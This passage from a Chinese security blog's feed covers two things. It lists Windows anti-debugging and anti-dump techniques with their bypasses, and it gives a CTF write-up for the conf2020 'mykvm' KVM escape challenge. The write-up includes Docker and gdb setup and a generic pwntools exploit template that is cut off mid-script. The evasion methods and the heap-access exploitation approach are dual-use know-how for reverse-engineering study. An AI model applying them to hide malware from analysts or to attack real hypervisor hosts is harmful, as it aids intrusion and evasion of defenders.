title="单步执行:"></a><strong>单步执行:</strong></h3><p>TF值为1时,CPU进入单步运行模式.CPU执行一条指令后就触发EXECEPTION_SINGLE_STEP异常,然后标志位自动清0 .</p><h3 id="破解之法-1"><a href="#破解之法-1" class="headerlink" title="破解之法:"></a><strong>破解之法:</strong></h3><p>打开OD调试选项忽略该异常.</p><h3 id="INT-2D"><a href="#INT-2D" class="headerlink" title="INT 2D:"></a><strong>INT 2D:</strong></h3><p>原为内核模式触发断点异常的指令,也可以在用户模式下触发异常.但程序调试运行时不会触发异常,只会简单忽略.这种正常模式和调试模式表现出的不同可以很好的运用于反调试.</p><h3 id="忽略下条指令的第一个字节"><a href="#忽略下条指令的第一个字节" class="headerlink" title="忽略下条指令的第一个字节:"></a><strong>忽略下条指令的第一个字节:</strong></h3><p>该反调试技术可以形成较强的代码混淆.</p><h3 id="一直运行到断点处"><a href="#一直运行到断点处" class="headerlink" title="一直运行到断点处:"></a><strong>一直运行到断点处:</strong></h3><p>用F7和F8时,不会停在下一条指令,直到遇到断点.</p><h2 id="0xCC探测"><a href="#0xCC探测" class="headerlink" title="0xCC探测:"></a><strong>0xCC探测:</strong></h2><p>若程序检测到0xCC指令,可以判断处于调试状态.</p><p>但这并不完全正确.</p><h3 id="API断点"><a href="#API断点" class="headerlink" title="API断点:"></a><strong>API断点:</strong></h3><p>断点一般设置在API代码的开始部分,只要检测API代码的第一个字节是否为CC就可以判断进程是否处于调试当中.</p><h3 id="破解之法-2"><a href="#破解之法-2" class="headerlink" title="破解之法:"></a><strong>破解之法:</strong></h3><p>在APi设置断点时,一般避开第一个字节.</p><p>设置硬件断点</p><h3 id="比较校验和"><a href="#比较校验和" class="headerlink" title="比较校验和:"></a><strong>比较校验和:</strong></h3><p>比较特定代码区域的校验和.如果在比较区域设置断点,指令变成0xcc,校验和就和原值不同,从而判断是否处于调试之中.(一般运用CRC32算法)</p><h3 id="破解之法-3"><a href="#破解之法-3" class="headerlink" title="破解之法:"></a><strong>破解之法:</strong></h3><p>只要不在计算CRC代码区域设置断点或者修改其中代码,该反调试就会失效.</p><p>修改CRC比较语句.</p><h1 id="高级反调试技术"><a href="#高级反调试技术" class="headerlink" title="高级反调试技术:"></a><strong>高级反调试技术:</strong></h1><h2 id="垃圾代码"><a href="#垃圾代码" class="headerlink" title="垃圾代码:"></a><strong>垃圾代码:</strong></h2><p>向程序中添加大量垃圾代码,而且代码中有真正有用的代码或者运用于其他反调试的代码.</p><h2 id="打乱代码对齐"><a href="#打乱代码对齐" class="headerlink" title="打乱代码对齐:"></a><strong>打乱代码对齐:</strong></h2><p>向代码中插入不必要的代码来降低反汇编的可读性的技术称为打乱代码对齐.</p><h2 id="加密-x2F-解密"><a href="#加密-x2F-解密" class="headerlink" title="加密&#x2F;解密:"></a><strong>加密&#x2F;解密:</strong></h2><p>隐藏代码数据,有效防止调试分析程序.</p><p>在程序某段代码中插入解密代码,只有执行这段代码才能解密出其他区域.</p><p>反转储技术:加密代码被解密后,会再次被加密.</p><h3 id="代码重组"><a href="#代码重组" class="headerlink" title="代码重组:"></a><strong>代码重组:</strong></h3><p>为了增加跟踪难度,采用了实时组合执行代码的技术手法.</p><p>在解码代码中若设置断点,会计算出不同的结果,从而造成解析错误,所以最好在该区域禁止写入初值.</p><h2 id="Stolen-Bytes-Remove-OEP"><a href="#Stolen-Bytes-Remove-OEP" class="headerlink" title="Stolen Bytes(Remove OEP):"></a><strong>Stolen Bytes(Remove OEP):</strong></h2><p>该技术将部分源代码转移到压缩器或者保护器创建的内存区域运行.</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点:"></a><strong>优点:</strong></h3><p>转储进程时,一部分OEP代码会被删除,转储的文件无法正常运行反转储技术.</p><p>运用该技术的文件再次经过压缩器&#x2F;保护器压缩后,会给逆向分析人员造成困难.文件脱壳,也不能找到OEP.</p><h2 id="API重定向"><a href="#API重定向" class="headerlink" title="API重定向:"></a><strong>API重定向:</strong></h2><p>程序会将全部或部分主要API代码复制到其他内存区域,然后分析要保护的目标进程的代码,修改调用API代码,从而使自身复制的API代码得以执行.这样,即使在原代码处设断点也没用(支持反转储功能)</p><h2 id="Debug-Bloker-Self-Debugging"><a href="#Debug-Bloker-Self-Debugging" class="headerlink" title="Debug Bloker(Self Debugging ):"></a><strong>Debug Bloker(Self Debugging ):</strong></h2><p>Debug Bloker时自我创建技术(以子进程形式运行自身进程).自我创建技术中,子进程负责执行实际原代码,父进程负责创建子进程,修改内存(代码&#x2F;数据),更改EP地址.所以仅调试父进程无法跳到OEP处.但将子进程附加到调试器,这种反调试就会失效.而Debug Bloker技术弥补这一缺点.</p><h3 id="Debug-Bloker技术优点"><a href="#Debug-Bloker技术优点" class="headerlink" title="Debug Bloker技术优点:"></a><strong>Debug Bloker技术优点:</strong></h3><p>防止代码调试.因子进程运行实际原代码已处于调试当中.原则上无法使用调试器附加操作.</p><p>能够控制子进程.在调试器-被调试者关系中,调试器具有很大权限,可以处理被调试进程的异常,控制代码执行流程.</p><p>jnz ： zf&#x3D;0就跳转 （值等于0，zf&#x3D;1</p><p>绕过IsDebuggerPresent ：</p><ol><li><p>将BeingDebugged标志设为0即可(或改变一下eax返回值)</p></li><li><p>在IsDebuggerPresent 函数前面patch加上retn 直接返回</p></li></ol><p>参考：</p><p><a href="https://www.freebuf.com/articles/others-articles/181085.html">https://www.freebuf.com/articles/others-articles/181085.html</a></p><p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/ntglobalflag/">https://ctf-wiki.org/reverse/windows/anti-debug/ntglobalflag/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>conf2020-mykvm</title>
      <link href="/2020/07/08/conf2020-mykvm/"/>
      <url>/2020/07/08/conf2020-mykvm/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/</a></p><p><a href="https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm">https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm</a></p><p>目标进程会读取用户输入送到实模式的kvm里，漏洞点为kvm映射的宿主进程内存空间过大，可以在kvm中访问到宿主进程的堆空间，因此可以通过shellcode读写宿主进程堆利用。需注意实模式下的shellcode只有1M的寻址空间（20根地址线），因此需要使用shellcode进入到保护模式才行。由于ASRL，存在恰巧堆空间与1M寻址空间相交集的可能，因此也可以爆破当恰巧遇到堆在1M可寻址范围内时，在实模式下直接对堆进行读写完成利用。</p><h2 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h2><ul><li><p>kvm的实现在linux内核中，用户态使用内核提供&#x2F;dev&#x2F;kvm设备节点使用kvm功能</p></li><li><p>kvm只能模拟CPU和内存，不支持模拟IO</p></li><li><p>所以如果要运行一个完整的虚拟机，带界面，IO的，所以不能单独使用kvm，必须和qemu一起</p></li><li><p>qemu可以单独运行虚拟机，也可以和kvm合作一起运行一个虚拟机</p></li><li><p>在qemu开启了-enable-kvm时，可以将guest部分代码通过&#x2F;dev&#x2F;kvm让内核中的kvm运行</p></li><li><p>那个如同vmware的图形界面的软件是virt-manager，底层还是调用kvm+qemu</p></li><li><p>&#x2F;dev&#x2F;kvm只是kvm内核模块提供给用户空间的一个接口，这个接口被qemu-kvm调用，通过ioctl系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机等。&#x2F;dev&#x2F;kvm设备是kvm(kernel-based virtual machine)虚拟机出来的一个设备文件，kvm提供了三个模块，分别是kvm.ko,kvm_intel.ko,kvm_amd.ko,后两个模块是根据物理主机的CPU所属厂家自动匹配的。</p><p>  Qemu的使用方式:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开/dev/kvm设备</span><br><span class="line"></span><br><span class="line">2.通过KVM_CREATE_VM创建一个虚拟机对象</span><br><span class="line"></span><br><span class="line">3.通过KVM_CREATE_VCPU为虚拟机创建vcpu对象</span><br><span class="line"></span><br><span class="line">4.通过KVM_RUN设置vcpu运行起来</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><img src="/2020/07/08/conf2020-mykvm/Untitled.png" class title="Untitled"><p><a href="http://blog.chinaunix.net/uid-14528823-id-4362394.html">恢复下</a>结构体</p><img src="/2020/07/08/conf2020-mykvm/Untitled1.png" class title="Untitled"><p>docker build .一下会</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">13</span>/<span class="number">13</span>] RUN chown -R root:ctf /home/ctf &amp;&amp;     chmod -R <span class="number">777</span> /home/ctf &amp;&amp;     chmod <span class="number">777</span> /home/ctf/flag:</span><br><span class="line">#<span class="number">17</span> <span class="number">9.052</span> chmod: cannot access <span class="string">&#x27;/home/ctf/flag&#x27;</span>: No such file or directory</span><br><span class="line">------</span><br><span class="line">executor failed running [/bin/sh -c chown -R root:ctf /home/ctf &amp;&amp;     chmod -R <span class="number">777</span> /home/ctf &amp;&amp;     chmod <span class="number">777</span> /home/ctf/flag]: <span class="built_in">exit</span> code: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>去掉chmod 777 &#x2F;home&#x2F;ctf&#x2F;flag</p><p>docker run –privileged -p 1234:1234 -p 8000:8888 -d mykvm:16.04</p><p>docker exec -it 46ad5dbac87f2077526c376a834e9cde8e70f43a582f26ba86eadc12be6fb843 &#x2F;bin&#x2F;bash</p><p>root@46ad5dbac87f:&#x2F;home&#x2F;ctf# ip show addr &amp;&amp; gdbserver :7779 .&#x2F;mykvm</p><p>这里不知道wsl的gdb连接一直超时，开个新docker连</p><p>可以通过 code_bss 访问到 dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br><span class="line">bss段大小为<span class="number">0x8000</span></span><br></pre></td></tr></table></figure><ul><li>memcpy为什么可以把栈上的指针 copy 到 bss 段？为什么映射内存范围过大，可以导致 guest 代码能访问到宿主机的 bss 段中的其他变量？跟bss段 有什么关系？</li></ul><p>gdb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- encoding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"># @File    : do_pwn_template.py</span><br><span class="line"># @Time    : <span class="number">2021</span>/<span class="number">04</span>/<span class="number">02</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">43</span></span><br><span class="line"># @Author  : Roderick Chan</span><br><span class="line"># @Email   : ch22166@<span class="number">163.</span>com</span><br><span class="line"># @Desc    : pwn题本地调试、远程攻击脚本</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">==========================================================================================</span><br><span class="line">本脚本为pwn题所编写，利用click模块配置命令行参数，</span><br><span class="line">能方便地进行本地调试和远程解题。</span><br><span class="line">本地命令示例：</span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename --tmux <span class="number">1</span> --gdb-breakpoint <span class="number">0x804802a</span> --gdb-breakpoint <span class="built_in">printf</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -t <span class="number">1</span> -gb <span class="number">0x804802a</span> -gb <span class="built_in">printf</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -t <span class="number">1</span> -gs <span class="string">&quot;x /12gx \$rebase(0x202080)&quot;</span> -sf <span class="number">0</span> -pl <span class="string">&quot;warn&quot;</span></span><br><span class="line">    即可开始本地调试,并且会断在地址或函数处。先启动tmux后，--tmux才会有效。</span><br><span class="line"></span><br><span class="line">远程命令示例：</span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">22164</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -p <span class="number">22164</span></span><br><span class="line">    可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。</span><br><span class="line"></span><br><span class="line">==========================================================================================</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">import click</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">import functools</span><br><span class="line"></span><br><span class="line">print(__doc__)</span><br><span class="line"></span><br><span class="line">FILENAME = <span class="string">&#x27;#&#x27;</span> # 要执行的文件名</span><br><span class="line">DEBUG = <span class="number">1</span> # 是否为调试模式</span><br><span class="line">TMUX = <span class="number">0</span> # 是否开启TMUX</span><br><span class="line">GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置</span><br><span class="line">GDB_SCRIPT = None # 当tmux开启的时候, gdb_script的设置，可以是任意有效的语句</span><br><span class="line">IP = None # 远程连接的IP</span><br><span class="line">PORT = None # 远程连接的端口</span><br><span class="line">LOCAL_LOG = <span class="number">1</span> # 本地LOG是否开启</span><br><span class="line">PWN_LOG_LEVEL = <span class="string">&#x27;debug&#x27;</span> <span class="meta"># pwntools的log级别设置</span></span><br><span class="line">STOP_FUNCTION = <span class="number">1</span> # STOP方法是否开启</span><br><span class="line"></span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[<span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;--help&#x27;</span>])</span><br><span class="line"></span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS, short_help=<span class="string">&#x27;Do pwn!&#x27;</span>)</span><br><span class="line">@click.argument(<span class="string">&#x27;filename&#x27;</span>, nargs=<span class="number">1</span>, type=str, required=<span class="number">0</span>, <span class="keyword">default</span>=None)</span><br><span class="line">@click.option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Excute program at local env or remote env. Default value: True.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--tmux&#x27;</span>, <span class="keyword">default</span>=False, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Excute program at tmux or not. Default value: False.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-gb&#x27;</span>, <span class="string">&#x27;--gdb-breakpoint&#x27;</span>, <span class="keyword">default</span>=[], type=str, multiple=True, help=<span class="string">&quot;Set a gdb breakpoint while tmux is enabled, is a hex address or &#x27;\$rebase&#x27; addr or a function name. Multiple setting supported. Default value:&#x27;[]&#x27;&quot;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-gs&#x27;</span>, <span class="string">&#x27;--gdb-script&#x27;</span>, <span class="keyword">default</span>=None, type=str, help=<span class="string">&quot;Set a gdb script while tmux is enabled, the script will be passed to gdb and use &#x27;\\n&#x27; or &#x27;;&#x27; to split lines. Default value:None&quot;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="keyword">default</span>=None, type=str, nargs=<span class="number">1</span>, help=<span class="string">&#x27;The remote ip addr. Default value: None.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="keyword">default</span>=None, type=<span class="type">int</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;The remote port. Default value: None.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-ll&#x27;</span>, <span class="string">&#x27;--local-log&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Set local log enabled or not. Default value: True.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-pl&#x27;</span>, <span class="string">&#x27;--pwn-log&#x27;</span>, type=click.Choice([<span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;warn&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;notset&#x27;</span>]), nargs=<span class="number">1</span>, <span class="keyword">default</span>=<span class="string">&#x27;debug&#x27;</span>, help=<span class="string">&#x27;Set pwntools log level. Default value: debug.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-sf&#x27;</span>, <span class="string">&#x27;--stop-function&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Set stop function enabled or not. Default value: True.&#x27;</span>)</span><br><span class="line">def parse_command_args(filename, debug, tmux, gdb_breakpoint, gdb_script,</span><br><span class="line">                       ip, port, local_log, pwn_log, stop_function):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>FILENAME: The filename of current directory to pwn<span class="number">&#x27;&#x27;&#x27;</span></span><br><span class="line">    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, GDB_SCRIPT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION</span><br><span class="line">    <span class="meta"># assign</span></span><br><span class="line">    FILENAME = filename</span><br><span class="line">    DEBUG = debug</span><br><span class="line">    TMUX = tmux</span><br><span class="line">    GDB_BREAKPOINT = gdb_breakpoint</span><br><span class="line">    GDB_SCRIPT = gdb_script</span><br><span class="line">    IP = ip</span><br><span class="line">    PORT = port</span><br><span class="line">    LOCAL_LOG = local_log</span><br><span class="line">    PWN_LOG_LEVEL = pwn_log</span><br><span class="line">    STOP_FUNCTION = stop_function</span><br><span class="line"></span><br><span class="line">    <span class="meta"># change</span></span><br><span class="line">    <span class="keyword">if</span> PORT: # 远程下这些是需要关闭的</span><br><span class="line">        DEBUG = <span class="number">0</span></span><br><span class="line">        TMUX = <span class="number">0</span></span><br><span class="line">        STOP_FUNCTION = <span class="number">0</span></span><br><span class="line">        GDB_BREAKPOINT = None</span><br><span class="line">        GDB_SCRIPT = None</span><br><span class="line">        <span class="keyword">if</span> IP is None:</span><br><span class="line">            IP = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        IP = None</span><br><span class="line">        PORT = None</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># assert</span></span><br><span class="line">    assert not (FILENAME is None and PORT is None), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (FILENAME is None and DEBUG == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (PORT is not None and DEBUG == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (DEBUG == <span class="number">0</span> and TMUX == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta"># print</span></span><br><span class="line">    click.echo(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">    click.echo(<span class="string">&#x27; [+] Args info:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> FILENAME:</span><br><span class="line">        click.echo(<span class="string">&#x27;  filename: %s&#x27;</span> % FILENAME)</span><br><span class="line">    click.echo(<span class="string">&#x27;  debug enabled: %d&#x27;</span> % DEBUG)</span><br><span class="line">    click.echo(<span class="string">&#x27;  tmux enabled: %d&#x27;</span> % TMUX)</span><br><span class="line">    <span class="keyword">if</span> GDB_BREAKPOINT:</span><br><span class="line">        click.echo(<span class="string">&#x27;  gdb breakpoint: &#123;&#125;&#x27;</span>.format(GDB_BREAKPOINT))</span><br><span class="line">    <span class="keyword">if</span> GDB_SCRIPT:</span><br><span class="line">click.echo(<span class="string">&quot;  gdb script: &#123;&#125;&quot;</span>.format(GDB_SCRIPT))</span><br><span class="line">    <span class="keyword">if</span> IP:</span><br><span class="line">        click.echo(<span class="string">&#x27;  remote ip: %s&#x27;</span> % IP)</span><br><span class="line">    <span class="keyword">if</span> PORT:</span><br><span class="line">        click.echo(<span class="string">&#x27;  remote port: %d&#x27;</span> % PORT)</span><br><span class="line">    click.echo(<span class="string">&#x27;  local log enabled: %d&#x27;</span> % LOCAL_LOG)</span><br><span class="line">    click.echo(<span class="string">&#x27;  pwn log_level: %s&#x27;</span> % PWN_LOG_LEVEL)</span><br><span class="line">    click.echo(<span class="string">&#x27;  stop function enabled: %d&#x27;</span> % STOP_FUNCTION)</span><br><span class="line">    click.echo(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">parse_command_args.main(standalone_mode=False)</span><br><span class="line"></span><br><span class="line"># 退出条件，只要参数有 -h 或 --help就退出</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> arg in sys.argv:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;-h&#x27;</span> == arg or <span class="string">&#x27;--help&#x27;</span> == arg:</span><br><span class="line">            sys.<span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(FILENAME))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> TMUX:</span><br><span class="line">    context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    tmp_all_gdb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> GDB_BREAKPOINT is not None or len(GDB_BREAKPOINT) &gt; <span class="number">0</span>:</span><br><span class="line">        # 解析每一条gdb-breakpoint</span><br><span class="line">        <span class="keyword">for</span> gb in GDB_BREAKPOINT:</span><br><span class="line">            <span class="keyword">if</span> gb.startswith(<span class="string">&#x27;0x&#x27;</span>) or gb.startswith(<span class="string">&#x27;$rebase(&#x27;</span>):</span><br><span class="line">                tmp_all_gdb += <span class="string">&quot;b *&#123;&#125;\n&quot;</span>.format(gb) # 带上*</span><br><span class="line">            <span class="keyword">else</span>: # 传入函数</span><br><span class="line">                tmp_all_gdb += <span class="string">&quot;b &#123;&#125;\n&quot;</span>.format(gb) # 不带*</span><br><span class="line">    <span class="keyword">if</span> GDB_SCRIPT is not None:</span><br><span class="line">        tmp_all_gdb += GDB_SCRIPT.replace(<span class="string">&quot;\\n&quot;</span>, <span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    tmp_all_gdb += <span class="string">&quot;c\n&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=tmp_all_gdb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> FILENAME:</span><br><span class="line">    cur_elf = ELF(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(FILENAME))</span><br><span class="line">    print(<span class="string">&#x27;[+] libc used ===&gt; &#123;&#125;&#x27;</span>.format(cur_elf.libc))</span><br><span class="line"></span><br><span class="line">def LOG_ADDR(addr_name:str, addr:<span class="type">int</span>):</span><br><span class="line">    <span class="keyword">if</span> LOCAL_LOG:</span><br><span class="line">        <span class="built_in">log</span>.success(<span class="string">&quot;&#123;&#125; ===&gt; &#123;&#125;&quot;</span>.format(addr_name, hex(addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def LOG_ADDR_EX(addr_name:str):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    存储地址的变量名，字符串</span><br><span class="line">    如：a = <span class="number">0xdeadbeef</span> </span><br><span class="line">    调用: LOG_ADDR_EX(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    